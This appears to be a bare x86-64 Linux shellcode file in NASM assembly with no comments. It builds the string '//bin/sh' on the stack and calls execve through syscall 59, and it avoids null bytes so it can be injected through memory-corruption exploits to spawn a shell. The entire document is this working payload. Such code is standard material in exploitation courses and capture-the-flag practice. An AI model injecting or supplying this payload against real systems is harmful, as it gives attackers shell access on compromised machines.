BITS 64
section .text:

global _start

_start:
  xor esi,esi
  mov rbx,0x68732f6e69622f2f
  push rsi
  push rbx
  push rsp
  pop rdi
  push 0x3b
  pop rax
  xor edx,edx
  syscall
